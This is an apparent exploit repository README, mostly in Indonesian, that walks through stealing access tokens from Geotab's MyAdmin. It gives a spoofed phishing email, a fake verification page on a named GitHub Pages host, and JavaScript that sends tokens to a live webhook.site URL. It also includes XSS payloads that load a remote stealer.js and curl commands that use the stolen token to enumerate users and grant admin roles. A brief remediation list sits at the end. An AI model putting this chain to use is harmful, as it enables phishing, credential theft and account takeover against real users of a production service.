# MNKD — MyAdmin Token Interception via safe Pipe + postMessage
## Step-to-Reproduce: Full Attack Chain

---

## Target Information

| Item | Value |
|------|-------|
| **Target** | MyAdmin (Geotab) — `https://myadmin.geotab.com` |
| **Bundle** | `aas.js` — 492,489 lines Angular webpack |
| **Vuln #1** | Custom `safe` Angular pipe: `bypassSecurityTrust*` disables all XSS sanitization |
| **Vuln #2** | postMessage `SET_ACCESS_TOKEN` sent to wildcard `*` origin |
| **Vuln #3** | `iframeNotifyParentOrigin` from server-supplied API config |
| **Vuln #4** | Open redirect via `returnUrl` substring bypass |
| **Vuln #7** | `window.inapp` exposes `userName`, `userType`, `roles[]` globally |
| **Vuln #8** | Auth code stored in `sessionStorage` |

---

## Attack Summary

```
VICTIM                          ATTACKER                        MYADMIN
  │                                │                               │
  │  (1) Click phishing link       │                               │
  │ ─────────────────────────────▶ │                               │
  │                                │                               │
  │  (2) Land on GitHub Pages      │                               │
  │  https://telojos11.github.io   │                               │
  │  /mnkd/                        │                               │
  │ ─────────────────────────────▶ │                               │
  │                                │                               │
  │  (3) Page auto-executes:       │                               │
  │    • Installs postMessage      │                               │
  │      listener                  │                               │
  │    • Loads MyAdmin in hidden   │                               │
  │      iframe / popup            │                               │
  │    • Probes open redirect      │                               │
  │                                │                               │
  │                                │  (4) If MyAdmin loads in      │
  │                                │  iframe/popup with victim's   │
  │                                │  active session:              │
  │                                │ ───────────────────────────▶  │
  │                                │                               │
  │                                │  (5) loader-component sends   │
  │                                │  SET_ACCESS_TOKEN to          │
  │                                │  postMessage(*, "*")          │
  │                                │  ◀─────────────────────────── │
  │                                │                               │
  │                                │  (6) Token caught by listener │
  │                                │  + window.inapp user data     │
  │                                │  + sessionStorage auth codes  │
  │                                │                               │
  │                                │  (7) All data sent to         │
  │                                │  webhook.site                 │
  │                                │                               │
  │  (8) Victim sees:              │                               │
  │  "Verification Complete"       │                               │
  │  ◀──────────────────────────── │                               │
  │                                │                               │
  │                                │  (9) Attacker opens webhook   │
  │                                │  → Sees token                 │
  │                                │  → curl -H "Auth: Bearer"     │
  │                                │  → Full account takeover      │
```

---

## PRE-REQUISITES (Attacker Setup)

### Step 0.1: Webhook SUDAH Terkonfigurasi

Webhook sudah terpasang di semua file exploit:
```
https://webhook.site/f59686a0-8650-40a5-8f62-32b4e98dd15c
```

Buka https://webhook.site untuk monitor incoming data.

### Step 0.2: Verifikasi Webhook

```bash
# Test — kirim data dummy
curl -X POST https://webhook.site/f59686a0-8650-40a5-8f62-32b4e98dd15c \
  -H "Content-Type: application/json" \
  -d '{"test":"hello"}'

# Buka https://webhook.site/f59686a0-8650-40a5-8f62-32b4e98dd15c
# Refresh — seharusnya muncul data
```

### Step 0.3: GitHub Pages SUDAH Aktif

Exploit sudah live di:
- **Main page:** `https://telojos11.github.io/mnkd/`
- **Stealer:** `https://telojos11.github.io/mnkd/stealer.js`
- **Capture page:** `https://telojos11.github.io/mnkd/capture.html`

---

## EXPLOITATION — Step by Step

### SCENARIO A: Victim Sudah Login ke MyAdmin (Passive Token Capture)

#### Step A.1: Attacker Kirim Phishing Link

Attacker mengirim email/SMS ke victim:

```
From: security@myadmin.com (spoofed)
Subject: ⚠️ Action Required: Verify Your MyAdmin Session

Body:
Dear User,

We detected unusual activity on your MyAdmin account.
Please verify your session immediately to prevent suspension.

Verify Session: https://telojos11.github.io/mnkd/

This link expires in 2 hours.
— MyAdmin Security Team
```

#### Step A.2: Victim Klik Link

Victim membuka `https://telojos11.github.io/mnkd/` di browser.

**Yang victim lihat:**

```
┌──────────────────────────────────────┐
│          🛡                         │
│   Session Verification               │
│   Verifying your session integrity.  │
│   This takes less than 10 seconds.   │
│                                      │
│   ▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░ 65%          │
│                                      │
│   ✓ Checking session status          │
│   → Establishing secure channel      │
│      with MyAdmin...                 │
│   ○ Verifying access token           │
│   ○ Completing verification          │
└──────────────────────────────────────┘
```

#### Step A.3: Exploit Engine Bekerja Otomatis

**Detik 0-1:** Passive postMessage listener terpasang

```javascript
// index.html, terpasang saat halaman load
window.addEventListener("message", function(e) {
  if (e.data?.type === "SET_ACCESS_TOKEN" && e.data.token) {
    // JACKPOT — kirim ke webhook
    fetch("https://webhook.site/UUID", {
      method: "POST",
      body: JSON.stringify({ token: e.data.token })
    });
  }
});
```

**Detik 1-3:** Hidden iframe load MyAdmin legacy pages

```javascript
// index.html — load 4 legacy path secara bergantian
f1.src = "https://myadmin.geotab.com/helpdesk.html?beta=1";
f2.src = "https://myadmin.geotab.com/rmarequests.htm?beta=1";
f1.src = "https://myadmin.geotab.com/timeline.html?beta=1";
f2.src = "https://myadmin.geotab.com/devicelookups.htm?serialno=test&beta=1";
```

**Mengapa legacy pages?** Karena `loader-component` di aas.js (line 302742-302869) me-load halaman legacy dalam iframe. Setelah iframe termuat, loader-component memanggil `postTokenToLegacyPage()` yang mengirim token via:

```javascript
// aas.js line 302864-302868
postTokenToLegacyPage(token) {
    this.pageElement.nativeElement.contentWindow.postMessage(
      { type: "SET_ACCESS_TOKEN", token: token },
      "*",   // ← WILDCARD TARGET ORIGIN
    );
}
```

**Detik 3-10:** Popup dibuka ke MyAdmin

```javascript
// index.html
var popup = window.open(
  "https://myadmin.geotab.com/home",
  "mw_" + Date.now(),
  "width=1200,height=800"
);

// Kirim crafted postMessage ke popup setiap 800ms
setInterval(function() {
  popup.postMessage({
    source: "oidc-client",
    url: "https://myadmin.geotab.com/silent-callback.html?code=test&state=bypass_test"
  }, "https://myadmin.geotab.com");

  popup.postMessage({ type: "NOTIFY", message: "security_check" }, "*");
}, 800);
```

**Mengapa popup?** Jika X-Frame-Options memblokir iframe, popup tetap bisa dibuka. Popup mewarisi cookies/session victim. Jika ada postMessage handler di MyAdmin yang memproses data dari popup opener secara unsafely, kita bisa trigger XSS.

**Detik 8-12:** Open redirect probing

```javascript
// index.html — test returnUrl bypass (Finding #4)
new Image().src = "https://myadmin.geotab.com/login?returnUrl=//telojos11.github.io/mnkd/capture";
new Image().src = "https://myadmin.geotab.com/login?returnUrl=https:%2F%2Ftelojos11.github.io%2Fmnkd%2Fcapture";
```

#### Step A.4: Token Tertangkap (JIKA BERHASIL)

**Case 1: X-Frame-Options TIDAK memblokir iframe**

Jika MyAdmin bisa dimuat di iframe:
1. Hidden iframe load `helpdesk.html?beta=1`
2. `loader-component` mendeteksi halaman legacy
3. Access token dikirim via `postMessage({type:"SET_ACCESS_TOKEN", token:"eyJ..."}, "*")`
4. **Target postMessage adalah contentWindow iframe** — jadi listener di halaman GitHub Pages TIDAK langsung menerima token ini (kecuali iframe memuat konten yang kita kontrol)

**Case 2: Victim MEMBUKA popup dan berinteraksi**

Jika victim mengizinkan popup:
1. Popup MyAdmin terbuka dengan session victim
2. Jika user sudah login, token dikirim ke iframe di dalam loader-component
3. Listener kita di opener window mungkin TIDAK menerima token secara langsung
4. TETAPI: crafted postMessage dari opener ke popup mungkin memicu behavior yang bisa kita exploitasi

**Case 3: Open redirect BERHASIL**

Jika returnUrl bypass bekerja:
1. Victim di-redirect dari MyAdmin ke `https://telojos11.github.io/mnkd/capture`
2. URL mungkin mengandung token/parameter di fragment
3. `capture.html` mem-parse semua parameter dan mengirim ke webhook

#### Step A.5: Attacker Cek Webhook

Attacker membuka `https://webhook.site` dan melihat data yang masuk:

```json
{
  "sid": "mnkd_1717400000000",
  "ts": "2026-06-03T10:00:00.000Z",
  "label": "TOKEN_INTERCEPTED",
  "data": {
    "type": "ACCESS_TOKEN_CAPTURED",
    "token": "eyJhbGciOiJSUzI1NiIsImtpZCI6Ik...",
    "origin": "https://myadmin.geotab.com",
    "source": "postMessage_wildcard_listener",
    "finding": "#2"
  }
}
```

#### Step A.6: Attacker Gunakan Token

```bash
# Validasi token — dapatkan profil user
curl -s https://myadmin.geotab.com/api/v1/Users/current \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIs..."

# Response:
# {
#   "id": "user-12345",
#   "userName": "admin@geotab.com",
#   "email": "admin@geotab.com",
#   "userType": "Internal",
#   "roles": [{"name": "Administrator"}, {"name": "SuperUser"}]
# }

# Enumerasi semua user di organisasi
curl -s https://myadmin.geotab.com/api/v1/Users \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIs..."

# Tambah role admin ke akun attacker
curl -X POST https://myadmin.geotab.com/api/v1/Users/CopyUserRoleAndUserType \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIs..." \
  -H "Content-Type: application/json" \
  -d '{"targetUserId": "attacker-user-id", "sourceUserId": "victim-admin-id"}'
```

---

### SCENARIO B: Chained dengan XSS via safe Pipe (Jika Ditemukan Reflected Parameter)

Ini adalah **skenario paling mematikan** — zero-click setelah halaman MyAdmin dimuat.

#### Step B.1: Temukan Reflected Parameter yang Mencapai safe Pipe

Lakukan live testing di MyAdmin:

```bash
# Test 1: returnUrl parameter
curl "https://myadmin.geotab.com/login?returnUrl=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"

# Test 2: data parameter (terlihat di queryParams.data — line analysis)
curl "https://myadmin.geotab.com/some-page?data=%3Csvg%20onload%3Dalert(1)%3E"

# Test 3: username parameter
curl "https://myadmin.geotab.com/some-page?username=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"

# Test 4: email parameter
curl "https://myadmin.geotab.com/some-page?email=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"

# Test 5: token parameter
curl "https://myadmin.geotab.com/some-page?token=%3Cbody%20onload%3Dalert(1)%3E"
```

#### Step B.2: Jika Ditemukan, Craft XSS URL

```
https://myadmin.geotab.com/vulnerable-page?param=<img src=x onerror="var s=document.createElement('script');s.src='https://telojos11.github.io/mnkd/stealer.js';document.head.appendChild(s);">
```

**Apa yang terjadi setelah victim klik URL ini:**

1. MyAdmin halaman `vulnerable-page` dimuat
2. Parameter `param` berisi payload XSS
3. Di template Angular: `{{ paramValue | safe:'html' }}` → `bypassSecurityTrustHtml()` dipanggil
4. HTML payload dirender MENTAH — `<img src=x onerror="...">` tereksekusi
5. `stealer.js` dimuat dari GitHub Pages ke dalam origin MyAdmin
6. stealer.js memasang postMessage listener **di dalam origin MyAdmin**
7. `loader-component` mengirim `SET_ACCESS_TOKEN` via postMessage ke `*`
8. **Kali ini listener kita MENERIMA token** — karena kita berada di origin yang sama dan postMessage targetnya wildcard
9. Token + window.inapp + sessionStorage + cookies → semua dikirim ke webhook

**Ini adalah FULL COMPROMISE — zero click setelah URL dibuka.**

#### Step B.3: Alternatif — Stored XSS via API/Ticket

Jika ada fitur yang menyimpan data lalu merendernya via safe pipe:

```
1. Attacker membuat help desk ticket dengan payload di deskripsi
2. Admin/support membuka ticket
3. Deskripsi ticket dirender via safe pipe
4. stealer.js tereksekusi di browser admin
5. Admin token dicuri → privilege escalation ke Administrator
```

---

### SCENARIO C: SignalR Message Injection (Advanced)

Jika attacker bisa mempengaruhi data yang dikirim via SignalR:

```bash
# Dari analysis: SignalR listener di line 117972
# Ht.on("UpdateReportsStatusAsync", un)

# Jika attacker bisa memanipulasi SignalR hub (via MITM atau API abuse):
# 1. Kirim pesan SignalR dengan payload XSS di field message
# 2. Pesan dirender via innerHTML di notification component (line 217020)
# 3. XSS tereksekusi
```

---

## VERIFICATION: Cara Memastikan Exploit Berhasil

### 1. Cek Webhook.site

```
Buka https://webhook.site → lihat incoming requests
Harus ada POST request dengan JSON body berisi:
  - type: "ACCESS_TOKEN_CAPTURED" (jika berhasil tangkap token)
  - type: "MODULE_LOADED" (jika MyAdmin berhasil di-load di iframe)
  - type: "OIDC_CALLBACK" (jika ada OIDC message)
  - type: "SUMMARY" (selalu ada — summary dari semua percobaan)
```

### 2. Cek Console Browser (saat development)

```javascript
// Buka halaman exploit dengan ?debug=1
// https://telojos11.github.io/mnkd/?debug=1

// Console akan menampilkan log berwarna:
// [MNKD] Stealer loading... sid=s_abc123
// [MNKD] postMessage hook installed
// [MNKD] ✓ beacon: TOKEN_CAPTURED
// 🔑 ACCESS TOKEN: eyJhbGciOi...
```

### 3. Validasi Token yang Dicuri

```bash
# Ganti TOKEN dengan token dari webhook
curl -v https://myadmin.geotab.com/api/v1/Users/current \
  -H "Authorization: Bearer TOKEN" \
  -H "X-XSRF-TOKEN: <dari cookie XSRF-TOKEN>"

# Jika return 200 + JSON user → token valid
# Jika return 401 → token expired/invalid
```

---

## FAILURE CASES: Kenapa Token Mungkin Tidak Tertangkap

| Case | Penyebab | Solusi |
|------|----------|--------|
| Iframe tidak load | `X-Frame-Options: DENY` di MyAdmin | Gunakan popup method atau cari XSS |
| Popup diblok browser | Browser memblokir `window.open` | Gunakan social engineering agar victim klik "Allow popups" |
| Token tidak dikirim ke `*` | postMessage target origin diubah dari `*` ke origin spesifik | Cari XSS dulu, lalu pasang listener dari dalam origin |
| Victim tidak login | Tidak ada session aktif di MyAdmin | Target victim yang sedang bekerja (jam kantor) |
| CSP enforced ketat | `script-src 'none'` | Gunakan DNS prefetch / CSS injection untuk exfiltrasi |

---

## IMPACT

| Data | Method | Severity |
|------|--------|----------|
| Access Token | postMessage interception (Finding #2) | **CRITICAL** |
| User Profile | `window.inapp` (Finding #7) | **HIGH** |
| Auth Code | `sessionStorage` (Finding #8) | **HIGH** |
| All Cookies | `document.cookie` | **HIGH** |
| API Responses | XHR/fetch hook | **MEDIUM** |
| User Roles | `window.inapp.roles` | **CRITICAL** |

**Account Takeover:** Token dapat digunakan langsung di `Authorization: Bearer` header.
**Privilege Escalation:** Jika victim adalah Administrator, attacker mendapat full access.

---

## REMEDIATION (Untuk MyAdmin Team)

1. **HAPUS safe pipe** — ganti dengan whitelist-based sanitizer (`sanitize-html`)
2. **HAPUS `bypassSecurityTrustScript`** — tidak ada use case yang legitimate
3. **Ganti `postMessage(..., "*")`** dengan target origin yang eksplisit
4. **Jangan render `innerHTML`** untuk notifikasi — gunakan Angular text binding `{{ }}`
5. **Set CSP:** `script-src 'self'; object-src 'none'; base-uri 'self'`
6. **Set X-Frame-Options: DENY**
7. **Simpan token di HttpOnly cookie**, jangan kirim via postMessage
8. **Validasi returnUrl** dengan proper URL parser, bukan `substring()`

---

## FILES IN THIS REPO

| File | URL | Purpose |
|------|-----|---------|
| `index.html` | `https://telojos11.github.io/mnkd/` | Main exploit delivery page — victim visits this |
| `stealer.js` | `https://telojos11.github.io/mnkd/stealer.js` | Exfiltration payload — injected via XSS |
| `capture.html` | `https://telojos11.github.io/mnkd/capture.html` | Open redirect landing page |
| `STEPS-TO-REPRODUCE.md` | (this file) | Full exploitation walkthrough |
